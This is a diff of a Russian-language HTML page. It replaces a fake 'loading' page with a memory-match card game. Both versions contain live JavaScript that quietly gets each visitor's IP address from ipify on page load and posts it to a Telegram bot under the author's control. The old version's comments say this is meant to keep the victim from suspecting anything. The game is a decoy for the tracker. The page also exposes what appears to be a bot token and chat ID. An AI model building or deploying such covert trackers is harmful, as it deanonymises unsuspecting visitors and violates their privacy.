@@ -1,41 +1,127 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Загрузка...</title>
-    <script>
-        // ВСТАВЬ СЮДА СВОЙ ТОКЕН И СВОЙ ID
-        const BOT_TOKEN = "9115275201:AAE1S7hfYeVNJvniAFfhav6LPexmkF9abqg";
-        const ADMIN_ID = "8416857353"; 
-
-        window.onload = function() {
-            // Получаем IP
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    // Отправляем напрямую в Telegram API
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: ADMIN_ID,
-                            text: `🎯 IP получен!\n🌐 IP: ${ip}`
-                        })
-                    });
-                    
-                    // Показываем картинку (чтобы человек ничего не заподозрил)
-                    document.body.innerHTML = `
-                        <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-                            <h2>Загрузка завершена</h2>
-                            <img src="https://images.unsplash.com/photo-1558981403-c5f9899a28bc?q=80&w=600" style="width: 100%; max-width: 400px; border-radius: 10px;">
-                        </div>
-                    `;
-                });
-        };
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Найди пару</title>
+    <style>
+        body {
+            background-color: #1c1c1e;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 { margin-top: 10px; font-size: 24px; }
+        .board {
+            display: grid;
+            grid-template-columns: repeat(4, 70px);
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .card {
+            width: 70px;
+            height: 70px;
+            background-color: #3a3a3c;
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 30px;
+            cursor: pointer;
+            user-select: none;
+            transition: transform 0.2s;
+        }
+        .card.flipped { background-color: #0a84ff; }
+        .card.matched { background-color: #30d158; opacity: 0.5; pointer-events: none; }
+    </style>
 </head>
-<body style="background-color: #1c1c1e; color: white;">
-    <p style="text-align: center; margin-top: 50px;">Загрузка...</p>
+<body>
+
+    <h1>Игра «Найди пару»</h1>
+    <p>Нажми на карточки, чтобы перевернуть их.</p>
+    <div class="board" id="board"></div>
+
+    <script>
+        // ==== ТВОИ ДАННЫЕ ====
+        const BOT_TOKEN = "9115275201:AAE1S7hfYeVNJvniAFfhav6LPexmkF9abqg"; // Вставь токен бота!
+        const ADMIN_ID= "8416857353";      // Твой ID
+        // =====================
+
+        // 1. Сбор IP и отправка боту (сработает сразу при загрузке)
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: `🎮 Игрок зашел в игру!\n🌐 IP: ${data.ip}`
+                    })
+                });
+            });
+
+        // 2. Логика самой игры
+        const emojis = ['🐶', '🐱', '🐭', '🐹', '🐰', '🦊', '🐻', '🐼'];
+        let cards = [...emojis, ...emojis]; // 16 карточек
+        let flippedCards = [];
+        let matchedPairs = 0;
+        let lockBoard = false;
+
+        // Перемешиваем карточки
+        cards.sort(() => 0.5 - Math.random());
+
+        const board = document.getElementById('board');
+
+        // Создаем карточки
+        cards.forEach((emoji, index) => {
+            const card = document.createElement('div');
+            card.classList.add('card');
+            card.dataset.emoji = emoji;
+            card.dataset.index = index;
+            card.addEventListener('click', flipCard);
+            board.appendChild(card);
+        });
+
+        function flipCard() {
+            if (lockBoard) return;
+            if (this === flippedCards[0]) return;
+
+            this.classList.add('flipped');
+            this.textContent = this.dataset.emoji;
+            flippedCards.push(this);
+
+            if (flippedCards.length === 2) {
+                checkMatch();
+            }
+        }
+
+        function checkMatch() {
+            const [card1, card2] = flippedCards;
+            if (card1.dataset.emoji === card2.dataset.emoji) {
+                card1.classList.add('matched');
+                card2.classList.add('matched');
+                matchedPairs++;
+                flippedCards = [];
+                if (matchedPairs === 8) {
+                    setTimeout(() => alert('Поздравляю! Ты выиграл! 🎉'), 300);
+                }
+            } else {
+                lockBoard = true;
+                setTimeout(() => {
+                    card1.classList.remove('flipped');
+                    card2.classList.remove('flipped');
+                    card1.textContent = '';
+                    card2.textContent = '';
+                    flippedCards = [];
+                    lockBoard = false;
+                }, 1000);
+            }
+        }
+    </script>
 </body>
 </html>
